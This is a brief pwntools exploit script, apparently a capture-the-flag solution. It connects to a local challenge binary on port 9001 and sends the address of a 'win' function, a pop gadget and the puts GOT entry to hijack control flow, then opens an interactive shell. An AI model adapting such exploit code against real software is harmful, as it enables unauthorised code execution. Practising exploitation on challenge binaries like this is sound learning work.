#!/usr/bin/env python3

from pwn import *

#context.log_level = "debug"
elf = ELF("./task", checksec=False)
context.binary = elf

#p = elf.process()
#p = elf.debug(gdbscript="")
p = remote("127.0.0.1", 9001)

POP_3 = 0x00000000004011d8

p.sendline(str(elf.sym["win"]).encode())
p.sendline(str(POP_3).encode())
p.sendline(str(elf.got["puts"]).encode())

p.interactive()
